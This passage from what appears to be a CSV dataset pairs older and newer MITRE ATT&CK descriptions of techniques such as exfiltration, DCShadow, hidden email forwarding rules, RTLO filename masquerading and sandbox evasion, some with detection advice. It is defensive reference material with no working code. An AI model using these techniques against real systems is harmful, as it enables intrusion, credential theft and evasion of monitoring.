PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

Administrator permissions are required to use PowerShell to connect to remote systems.

A number of PowerShell-based offensive testing tools are available, including Empire, (Citation: Github PowerShell Empire) PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)"
A039,T1048,2.0,3.0,Exfiltration Over Alternative Protocol,Exfiltration Over Alternative Protocol,"Data exfiltration is performed with a different protocol from the main command and control protocol or channel. The data is likely to be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, or some other network protocol. Different channels could include Internet Web services such as cloud storage.

Detection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: User interface, Process monitoring, Process use of network, Packet capture, Netflow/Enclave netflow, Network protocol analysis

Requires Network: Yes","Data exfiltration is performed with a different protocol from the main command and control protocol or channel. The data is likely to be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, or some other network protocol. Different channels could include Internet Web services such as cloud storage."
A040,T1588.007,18.0,19.0,Artificial Intelligence,Artificial Intelligence,"Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks, including conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043), creating basic scripts, assisting social engineering, and even developing payloads.(Citation: MSFT-AI) 

For example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in [Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing for Information](https://attack.mitre.org/techniques/T1598) campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting [Develop Capabilities](https://attack.mitre.org/techniques/T1587). AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)) malicious scripts and payloads.(Citation: OpenAI-CTI) Finally, AI-generated text, images, audio, and video may be used for fraud, [Impersonation](https://attack.mitre.org/techniques/T1656), and other malicious activities.(Citation: Google-Vishing24)(Citation: IC3-AI24)(Citation: WSJ-Vishing-AI24)
","Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks, including conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043), creating basic scripts, assisting social engineering, and even developing payloads.(Citation: MSFT-AI) 

For example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in [Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing for Information](https://attack.mitre.org/techniques/T1598) campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting [Develop Capabilities](https://attack.mitre.org/techniques/T1587). AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)) malicious scripts and payloads.(Citation: OpenAI-CTI) Finally, AI-generated text, images, audio, and video may be used for fraud, [Impersonation](https://attack.mitre.org/techniques/T1684/001), and other malicious activities.(Citation: Google-Vishing24)(Citation: IC3-AI24)(Citation: WSJ-Vishing-AI24)
"
A041,T1078,3.0,4.0,Valid Accounts,Valid Accounts,"Adversaries may steal the credentials of a specific user or service account using Credential Access techniques or capture credentials earlier in their reconnaissance process through social engineering for means of gaining Initial Access. 

Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

Adversaries may also create accounts, sometimes using pre-defined account names and passwords, as a means for persistence through backup access in case other means are unsuccessful. 

The overlap of credentials and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)","Adversaries may steal the credentials of a specific user or service account using Credential Access techniques or capture credentials earlier in their reconnaissance process through social engineering for means of gaining Initial Access. 

Accounts that an adversary may use can fall into three categories: default, local, and domain accounts. Default accounts are those that are built-into an OS such as Guest or Administrator account on Windows systems or default factory/provider set accounts on other types of systems, software, or devices. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. (Citation: Microsoft Local Accounts Feb 2019) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.

Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

Default accounts are also not limited to Guest and Administrator on client machines, they also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or COTS. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed private keys, or stolen private keys, to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021) (Citation: Metasploit SSH Module)

The overlap of account access, credentials, and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)"
A042,T1059.006,14.0,15.0,Python,Python,"Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.

Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.","Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.(Citation: Zscaler APT31 Covid-19 October 2020)

Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors."
A043,T1065,2.0,3.0,Uncommonly Used Port,Uncommonly Used Port,"Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.

Detection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: Netflow/Enclave netflow, Process use of network, Process monitoring

Requires Network: Yes",Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.
A044,T1190,3.0,4.0,Exploit Public-Facing Application,Exploit Public-Facing Application,"The use of software, data, or commands to take advantage of a weakness in an Internet-facing computer system or program in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL) (Citation: NVD CVE-2016-6662), standard services (like SMB (Citation: CIS Multiple SMB Vulnerabilities) or SSH), and any other applications with Internet accessible open sockets, such as web servers and related services. (Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may include [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211).

For websites and databases, the OWASP top 10 gives a good list of the top 10 most common web-based vulnerabilities. (Citation: OWASP Top 10)","The use of software, data, or commands to take advantage of a weakness in an Internet-facing computer system or program in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL) (Citation: NVD CVE-2016-6662), standard services (like SMB (Citation: CIS Multiple SMB Vulnerabilities) or SSH), and any other applications with Internet accessible open sockets, such as web servers and related services. (Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may include [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211).

For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities. (Citation: OWASP Top 10) (Citation: CWE top 25)"
A045,T1211,18.0,19.0,Exploitation for Defense Evasion,Exploitation for Stealth,"Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.

Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.

There have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries (Citation: Salesforce zero-day in facebook phishing attack), evade security logs (Citation: Bypassing CloudTrail in AWS Service Catalog), or deploy hidden infrastructure.(Citation: GhostToken GCP flaw)","Adversaries may exploit vulnerabilities to evade detection by hiding activity, suppressing logging, or operating within trusted or unmonitored components. 

Adversaries may exploit a system or application vulnerability to avoid detection while maintaining access within an environment. Exploitation occurs when an adversary leverages a programming flaw to execute code in a manner that minimizes visibility or blends in with legitimate activity. 

Rather than directly disabling defenses, adversaries may use exploitation to circumvent monitoring and logging mechanisms. This can include abusing vulnerabilities in logging pipelines, security tools, or cloud infrastructure to evade audit trails, suppress alerts, or operate without generating telemetry. 

Adversaries may identify these opportunities through prior reconnaissance or by performing discovery of security controls after initial access. In some cases, vulnerabilities in SaaS or public cloud environments may be exploited to evade logging, obscure activity, or deploy infrastructure that remains hidden from standard monitoring tools.(Citation: Bypassing CloudTrail in AWS Service Catalog)(Citation: GhostToken GCP flaw)"
A046,T1497.003,17.0,18.0,Time Based Evasion,Time Based Checks,"Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.

Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) to avoid analysis and scrutiny.(Citation: Deloitte Environment Awareness)

Benign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as [Ping](https://attack.mitre.org/software/S0097)s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.(Citation: Revil Independence Day)(Citation: Netskope Nitol) Another variation, commonly referred to as API hammering, involves making various calls to [Native API](https://attack.mitre.org/techniques/T1106) functions in order to delay execution (while also potentially overloading analysis environments with junk data).(Citation: Joe Sec Nymaim)(Citation: Joe Sec Trickbot)

Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.(Citation: ISACA Malware Tricks)","Adversaries may employ various time-based methods to detect virtualization and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. This may include enumerating time-based properties, such as uptime or the system clock. 

Adversaries may use calls like `GetTickCount` and `GetSystemTimeAsFileTime` to discover if they are operating within a virtual machine or sandbox, or may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.(Citation: ISACA Malware Tricks)"
A047,T1098.002,14.0,15.0,Additional Email Delegate Permissions,Additional Email Delegate Permissions,"Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. 

For example, the <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018) In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.(Citation: Gmail Delegation)(Citation: Google Ensuring Your Information is Safe) 

Adversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders.(Citation: Remediation and Hardening Strategies for Microsoft 365 to Defend Against UNC2452)

This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)","Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. 

For example, the <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018) In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.(Citation: Gmail Delegation)(Citation: Google Ensuring Your Information is Safe) 

Adversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders.(Citation: Mandiant Defend UNC2452 White Paper)

This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)"
A048,T1207,6.0,7.0,DCShadow,Rogue Domain Controller,"DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a Domain Controller (DC). (Citation: DCShadow Blog) (Citation: BlueHat DCShadow Jan 2018) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.

Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)

This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1178) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog) (Citation: BlueHat DCShadow Jan 2018)","Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.

Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)

This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1178) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)"
A049,T1114.003,9.0,10.0,Email Forwarding Rule,Email Forwarding Rule,"Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Outlook and Outlook Web App (OWA) allow users to create inbox rules for various email functions, including forwarding to a different recipient. Similarly, Google Workspace users or administrators can set up mail forwarding rules via the Google Workspace web interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) 

Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more.","Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.(Citation: Pfammatter - Hidden Inbox Rules) Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2)(Citation: Mac Forwarding Rules)

Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.(Citation: Pfammatter - Hidden Inbox Rules)"
A050,T1204,14.0,15.0,User Execution,User Execution,"An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).

While [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).

Adversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary, or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204). For example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)","An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).

While [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).

Adversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s; or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204).(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)

For example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)"
A051,T1020,2.0,3.0,Automated Exfiltration,Automated Exfiltration,"Data, such as sensitive documents, may be exfiltrated through the use of automated processing or Scripting after being gathered during Collection. 

When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over Command and Control Channel and Exfiltration Over Alternative Protocol.

Detection: Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious.

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Process monitoring, Process use of network

Requires Network: Yes","Data, such as sensitive documents, may be exfiltrated through the use of automated processing or [Scripting](https://attack.mitre.org/techniques/T1064) after being gathered during Collection. 

When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over Command and Control Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048)."
A052,T1114,6.0,7.0,Email Collection,Email Collection,"Adversaries may target user email to collect sensitive information from a target.

Files containing email data can be acquired from a user's system, such as Outlook storage or cache files .pst and .ost.

Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services or Office 365 to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific key words.(Citation: Black Hills MailSniper, 2017)

### Email Forwarding Rule

Adversaries may also abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Outlook and Outlook Web App (OWA) allow users to create inbox rules for various email functions, including forwarding to a different recipient. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: TIMMCMIC, 2014)

Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. ","Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. "
A053,T1036,6.0,7.0,Masquerading,Masquerading,"Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. Several different variations of this technique have been observed.

One variant is for an executable to be placed in a commonly trusted directory or given the name of a legitimate, trusted program. Alternatively, the filename given may be a close approximation of legitimate programs or something innocuous. An example of this is when a common system utility or program is moved and renamed to avoid detection based on its usage.(Citation: FireEye APT10 Sept 2018) This is done to bypass tools that trust executables by relying on file name or path, as well as to deceive defenders and system administrators into thinking a file is benign by associating the name with something that is thought to be legitimate.

A third variant uses the right-to-left override (RTLO or RLO) character (U+202E) as a means of tricking a user into executing what they think is a benign file type but is actually executable code. RTLO is a non-printing character that causes the text that follows it to be displayed in reverse.(Citation: Infosecinstitute RTLO Technique) For example, a Windows screensaver file named <code>March 25 \u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>. A common use of this technique is with spearphishing attachments since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default. 

Adversaries may modify a binary's metadata, including such fields as icons, version, name of the product, description, and copyright, to better blend in with the environment and increase chances of deceiving a security analyst or product.(Citation: Threatexpress MetaTwin 2017)

### Windows
In another variation of this technique, an adversary may use a renamed copy of a legitimate utility, such as rundll32.exe. (Citation: Endgame Masquerade Ball) An alternative case occurs when a legitimate utility is moved to a different directory and also renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke)

An example of abuse of trusted locations in Windows would be the <code>C:\Windows\System32</code> directory. Examples of trusted binary names that can be given to malicious binares include ""explorer.exe"" and ""svchost.exe"".

### Linux
Another variation of this technique includes malicious binaries changing the name of their running process to that of a trusted or benign process, after they have been launched as opposed to before. (Citation: Remaiten)

An example of abuse of trusted locations in Linux  would be the <code>/bin</code> directory. Examples of trusted binary names that can be given to malicious binaries include ""rsyncd"" and ""dbus-inotifier"". (Citation: Fysbis Palo Alto Analysis)  (Citation: Fysbis Dr Web Analysis)","Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.

Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)"
A054,T1056.002,10.0,11.0,GUI Input Capture,GUI Input Capture,"Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).

Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems attackers may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs) ","Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).

Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs) "
A055,T1213,2.0,3.0,Data from Information Repositories,Data from Information Repositories,"Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.

The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:

* Policies, procedures, and standards
* Physical / logical network diagrams
* System architecture diagrams
* Technical system documentation
* Testing / development credentials
* Work / project schedules
* Source code snippets
* Links to network shares and other internal resources

Common information repositories:

===Microsoft SharePoint===
Found in many enterprise networks and often used to store and share significant amounts of documentation.

===Atlassian Confluence===
Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation.

Detection: As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should not generally used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.

The user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents. (Citation: Microsoft SharePoint Logging) The user user access logging within Atlassian's Confluence can also be configured to report access to certain pages and documents through AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities.

Platforms: Linux, Windows, macOS

Data Sources: Application Logs, Authentication logs, Data loss prevention, Third-party application logs

Permissions Required: User

Contributors: Milos Stojadinovic","Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.

The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:

* Policies, procedures, and standards
* Physical / logical network diagrams
* System architecture diagrams
* Technical system documentation
* Testing / development credentials
* Work / project schedules
* Source code snippets
* Links to network shares and other internal resources

Specific common information repositories include:

### Microsoft SharePoint
Found in many enterprise networks and often used to store and share significant amounts of documentation.

### Atlassian Confluence
Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation."
